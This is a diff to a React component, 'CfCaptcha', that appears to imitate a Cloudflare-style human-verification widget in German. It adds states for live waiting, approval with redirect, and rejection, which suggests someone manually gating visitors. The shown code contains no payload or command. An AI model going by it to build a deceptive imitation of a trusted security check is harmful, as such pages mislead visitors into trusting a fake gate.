@@ -276,7 +276,7 @@ const CfCaptcha = () => {
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bestätigen Sie, dass Sie ein Mensch sind</span>
                   </>
                 )}
-                {(phase === "verifying" || phase === "waiting") && (
+                {(phase === "verifying") && (
                   <>
                     <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Überprüfung läuft...</span>
@@ -288,6 +288,28 @@ const CfCaptcha = () => {
                       <Check className="h-4 w-4 text-white" strokeWidth={3} />
                     </div>
                     <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Erfolgreich!</span>
+                  </>
+                )}
+                {phase === "liveWaiting" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bitte warten. Ihre Verbindung wird geprüft...</span>
+                  </>
+                )}
+                {phase === "liveApproved" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full bg-[#2e7d32] flex items-center justify-center">
+                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
+                    </div>
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Verifizierung erfolgreich. Sie werden weitergeleitet.</span>
+                  </>
+                )}
+                {phase === "liveRejected" && (
+                  <>
+                    <div className="h-6 w-6 shrink-0 rounded-full bg-[#c62828] flex items-center justify-center">
+                      <span className="text-white text-[14px] font-bold leading-none">✕</span>
+                    </div>
+                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Verifizierung nicht möglich. Sie werden nicht weitergeleitet.</span>
                   </>
                 )}
               </div>
